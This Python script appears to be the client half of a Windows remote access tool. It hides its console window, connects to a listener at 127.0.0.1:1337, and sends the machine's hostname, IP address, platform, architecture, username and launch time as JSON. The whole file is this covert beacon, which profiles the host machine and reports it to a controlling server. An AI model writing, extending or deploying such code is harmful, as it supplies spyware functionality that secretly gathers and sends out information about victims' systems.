import os , win32api,win32gui
import sys, socket
import platform
import json ,time
import win32con


# One Shot

HOSTNAME = []
IPADRESS = []
TIME =     []
PLATFORM = []
USERNAME = []

hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, False)

try:

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host = "127.0.0.1"
    port = 1337

    s.connect((host,port))

except ConnectionRefusedError:
    s.close()
    sys.exit()

# Get Client Informations

gethoname = win32api.GetComputerName() #Get Hostname
time = time.ctime() # Get Open Time
getipadress,ports = s.getsockname() #  Get Ip Adress
versionsun = platform.platform() # Get Platform
osbit = platform.architecture() # Get Arch
usergelme = os.environ['USERNAME'] # Get Username

#Append Arg

HOSTNAME.append(gethoname)
IPADRESS.append(getipadress)
PLATFORM.append(versionsun)
PLATFORM.append(osbit[0])
USERNAME.append(usergelme)
TIME.append(time)

dict = {"hostname":HOSTNAME,"ipadress":IPADRESS,"platform":PLATFORM,"username":USERNAME,"time":TIME}

s.sendall(json.dumps(dict).encode())
